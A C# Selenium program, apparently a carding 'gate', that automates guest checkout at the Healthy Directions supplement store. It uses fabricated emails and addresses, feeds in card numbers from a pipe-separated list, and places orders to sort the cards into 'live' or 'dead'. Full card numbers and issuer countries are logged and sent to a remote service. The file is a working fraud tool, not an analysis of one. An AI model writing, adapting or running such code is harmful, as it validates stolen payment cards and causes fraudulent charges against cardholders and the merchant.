using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Healthydirections
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 5;
            string nuevacadena = "1630";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 10)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {
            var chromeOptions = new ChromeOptions();
            correo = "joseffernana" + getNum() + "@gmail.com";
            clave = "Jo." + getNum();

            //chromeOptions.AddArguments(new List<string>() { "headless" });
            //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
            chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito");

            
            var chromeDriverService = ChromeDriverService.CreateDefaultService();
            chromeDriverService.HideCommandPromptWindow = true;

            driver = new ChromeDriver(chromeDriverService, chromeOptions);
            driver.Url = "https://www.healthydirections.com/shop-all-supplements-hdsub20216?Nrpp=36&Ns=product.price|0";
            Thread.Sleep(1000);
            correo = "joseffernana" + getNum() + "@gmail.com";

            Form1.circularProgressBar1.Value = 5;

            Thread.Sleep(3000);

            //select producto

            var producto = RandomNumber(1, 36);

            if (tiempoElemento(By.XPath("//*[@id='mainResultsList']/div/div/div[1]/article[" + producto + "]/div/p/a")))
            {
                Form1.circularProgressBar1.Value = 10;
                driver.FindElement(By.XPath("//*[@id='mainResultsList']/div/div/div[1]/article[" + producto + "]/div/p/a")).Click();
            }
            else
            {
                restart();
            }

            Thread.Sleep(1000);

            //agregar al carrito 

            if (tiempoElemento(By.XPath("//*[@id='autoDelivery']/div/button")))
            {
                Form1.circularProgressBar1.Value = 30;
                driver.FindElement(By.XPath("//*[@id='autoDelivery']/div/button")).Click();
            }
            else
            {
                restart();
            }

            Thread.Sleep(1000);
            //ir a pagar

            if (IsElementPresent(By.XPath("//*[@id='dialog']/div/div/div[2]/p[2]/a[2]")))
            {
                Form1.circularProgressBar1.Value = 40;
                driver.FindElement(By.XPath("//*[@id='dialog']/div/div/div[2]/p[2]/a[2]")).Click();
            }


            if (tiempoElemento(By.XPath("//*[@id='main']/div[6]/div[2]/div[1]/a")))
            {
                Form1.circularProgressBar1.Value = 50;
                driver.FindElement(By.XPath("//*[@id='main']/div[6]/div[2]/div[1]/a")).Click();
            }
            else
            {
                restart();
            }
            Thread.Sleep(1000);

            //invitado
            if (tiempoElemento(By.XPath("//*[@id='mainLoginContainerRight']/div[1]/label")))
            {
                Form1.circularProgressBar1.Value = 55;
                driver.FindElement(By.XPath("//*[@id='mainLoginContainerRight']/div[1]/label")).Click();
            }
            else
            {
                restart();
            }
            Thread.Sleep(1000);

            //email invitado

            if (tiempoElemento(By.Id("checkout-email-1")))
            {
                Form1.circularProgressBar1.Value = 60;
                driver.FindElement(By.Id("checkout-email-1")).SendKeys(correo);
                Thread.Sleep(1000);
                driver.FindElement(By.XPath("//*[@id='checkout-guest-form']/div[3]/button")).Submit();
            }
            else
            {
                restart();
            }

            Thread.Sleep(3000);

            driver.ExecuteJavaScript("document.querySelector('body > div.ui-dialog.ui-widget.ui-widget-content.ui-corner-all.ui-front.fixed').remove();");
            Thread.Sleep(1000);
            driver.ExecuteJavaScript("document.querySelector('body > div.ui-widget-overlay.ui-front').remove();");
            Thread.Sleep(1000);
            //crear cuenta

            if (tiempoElemento(By.Id("inputNameFirst")))
            {
                Thread.Sleep(500);
                Form1.circularProgressBar1.Value = 70;
                driver.FindElement(By.Id("inputNameFirst")).SendKeys("JOSE");
                driver.FindElement(By.Id("inputNameLast")).SendKeys("FERNANDEZ");
                driver.FindElement(By.Id("inputAddr")).SendKeys("strett 45");
                driver.FindElement(By.Id("inputCity")).SendKeys("NEW YORK");

                var estado = new SelectElement(driver.FindElement(By.Id("state")));
                estado.SelectByValue("NY");

                driver.FindElement(By.Id("zip")).SendKeys("10001");
                Thread.Sleep(500);

                driver.FindElement(By.XPath("//*[@id='collapseTwo']/div/div/div[2]/div[4]/div/button")).Click();

                Thread.Sleep(2000);

                if (IsElementPresent(By.XPath("//*[@id='collapseTwo']/div/div/div[2]/div[2]/div/div/ul/li[1]/button")))
                {
                    Form1.circularProgressBar1.Value = 80;
                    driver.FindElement(By.XPath("//*[@id='collapseTwo']/div/div/div[2]/div[2]/div/div/ul/li[1]/button")).Click();
                }
            }
            else
            {
                restart();
            }


            Thread.Sleep(1000);

            //METODO DE ENVIO

            if (tiempoElemento(By.Id("applyShippingMethodsButton")))
            {
                Form1.circularProgressBar1.Value = 80;
                driver.FindElement(By.Id("applyShippingMethodsButton")).Click();
            }
            else
            {
                restart();
            }

            Thread.Sleep(2000);

            pago();
        }

        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(2000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            driver.Close();
            driver.Quit();
            pagos = 0;
            System.Threading.Thread.Sleep(3000);
            load();
        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0)
                {
                    if (pagos < 2)
                    {
                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        Form1.circularProgressBar1.Value = 90;
                        //INSERT CC
                        driver.FindElement(By.Id("inputCardNumber")).SendKeys(ccLine[0] + Keys.Tab);
                        Thread.Sleep(500);
                        var name = driver.SwitchTo().ActiveElement();
                        name.SendKeys("DAVID" + Keys.Tab);
                        Thread.Sleep(500);
                        var last = driver.SwitchTo().ActiveElement();
                        last.SendKeys("REYES" + Keys.Tab);
                        Thread.Sleep(500);
                        if (ccLine[3].Trim().Length == 3)
                        {
                            driver.FindElement(By.Id("inputCvv")).SendKeys("000");
                        }
                        else
                        {
                            driver.FindElement(By.Id("inputCvv")).SendKeys("0000");
                        }

                        Thread.Sleep(500);
                        var mes = new SelectElement(driver.FindElement(By.Id("eExpirationSelectboxMonth")));
                        mes.SelectByValue(ccLine[1]);
                        Thread.Sleep(500);
                        var anio = new SelectElement(driver.FindElement(By.XPath("//*[@id='main']/div[4]/div[1]/div[3]/div/div/div[2]/div[4]/div/div/div[1]/div[2]/div/div[3]/div[2]/div[2]/div/div/div[5]/div/div/div[2]/select")));
                        anio.SelectByValue(ccLine[2].Remove(0, 2));
                        Thread.Sleep(1000);
                        driver.FindElement(By.Id("sameAsBillingAddress")).Click();

                        if (tiempoElemento(By.XPath("//*[@id='main']/div[4]/div[1]/div[3]/div/div/div[2]/div[4]/div/div/div[1]/div[2]/div/div[3]/div[2]/div[2]/div/div/div[9]/div/button")))
                        {
                            driver.FindElement(By.XPath("//*[@id='main']/div[4]/div[1]/div[3]/div/div/div[2]/div[4]/div/div/div[1]/div[2]/div/div[3]/div[2]/div[2]/div/div/div[9]/div/button")).Click();
                        }
                        else
                        {
                            restart();
                        }

                        Thread.Sleep(1000);
                        //submint order
                        if (tiempoElemento(By.XPath("//*[@id='placeOrderBottomButton']")))
                        {
                            driver.FindElement(By.XPath("//*[@id='placeOrderBottomButton']")).Submit();
                        }
                        else
                        {
                            restart();
                        }

                        Thread.Sleep(2000);


                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;

                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6))+" "+Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");

                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Thread.Sleep(300);
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6))+" "+Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                // MessageBox.Show(ex.ToString());
                restart();

            }

        }

         public void stop()
        {
            pagos = 0;
            numeroTargeta = 0;
            driver.Close();
            driver.Quit();
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;
            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 30)
                {
                    if (IsElementPresent(By.XPath("//*[@id='main']/div[5]/aside/div[1]")))
                    {
                        estado = "dead";

                    }

                    //live
                    if (IsElementPresent(By.XPath("//*[@id='main']/div[1]/h2")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='main']/div[1]/h2")).Text.Trim() == "Order Confirmation")
                        {
                            estado = "live";

                        }
                    }
                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {

                driver.FindElement(By.XPath("//*[@id='main']/div[4]/div[1]/div[3]/div/div/div[1]/h3/a")).Click();
                Thread.Sleep(2000);
                driver.FindElement(By.XPath("//*[@id='enter-new-credit-card']")).Click();
                Thread.Sleep(2000);

                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }


        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

